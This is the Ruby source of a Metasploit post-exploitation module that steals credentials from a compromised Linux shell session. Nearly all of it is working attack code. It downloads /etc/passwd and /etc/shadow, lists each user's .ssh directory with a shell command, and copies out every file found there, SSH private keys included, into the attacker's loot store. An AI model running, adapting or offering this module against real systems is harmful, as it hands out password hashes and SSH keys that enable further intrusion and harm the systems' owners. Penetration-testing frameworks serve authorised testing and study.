		# $Id: passwd-shadow-ssh-jacker-shell.rb 2012-05-01 rapid7 $

		##
		# This file is part of the Metasploit Framework and may be subject to
		# redistribution and commercial restrictions. Please see the Metasploit
		# web site for more information on licensing and terms of use.
		#   http://metasploit.com/
		##

		require 'msf/core'
		require 'rex'
		require 'msf/core/post/common'
		require 'msf/core/post/file'
		require 'msf/core/post/linux/priv'
		require 'msf/core/post/linux/system'


		class Metasploit3 < Msf::Post

			include Msf::Post::Common
			include Msf::Post::File
			include Msf::Auxiliary::Report
			include Msf::Post::Linux::Priv
			include Msf::Post::Linux::System
			include Msf::Post::Unix
			def initialize(info={})
				super( update_info( info,
						'Name'          => 'Linux Important Data Jacker - Shell Version',
						'Description'   => %q{
							This module will download /etc/passwd /etc/shadow and try to find SSH keys and download them
						},
						'License'       => MSF_LICENSE,
						'Author'        => [ 'balgan <balgan[at]balgan.eu>','SSH Based on Jim Halfpenny'],
						'Version'       => '$Revision: 3195e713 $',
						'Platform'      => [ 'linux'],
						'SessionTypes'  => [ 'shell']
					))
			end


			def run
				print_status("Attempting to steal information")
				jack_etc()
				get_ssh_keys()
			end

			def jack_etc()
				filestojack = ["/etc/passwd", "/etc/shadow"]
				filestojack.each do |file|
					print_status("Downloading #{file} -> #{file}")
					data = read_file("#{file}")
					store_loot("ssh.#{file}", "text/plain", session, data,"ssh_#{file}", "File #{file}")
				end
			end

			def get_ssh_keys()

				print_status("Finding .ssh directories")
				paths = enum_user_directories.map {|d| d + "/.ssh"}
				paths = paths.select { |d| directory?(d) }
				if paths.nil? or paths.empty?
					print_error("COULD NOT FIND .SSH, might be permissions issue")
				else
				paths.each do |path|
					path.chomp!
					sep = "/"
					files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
					print_status("PASSOU O LS")
					files.each do |file|
						print_status("Downloading #{path}#{sep}#{file} -> #{file}")
						data = read_file("#{path}#{sep}#{file}")
						store_loot("ssh.#{file}", "text/plain", session, data,"ssh_#{file}", "OpenSSH #{file} File")
					end
				end
			end

		end

	end
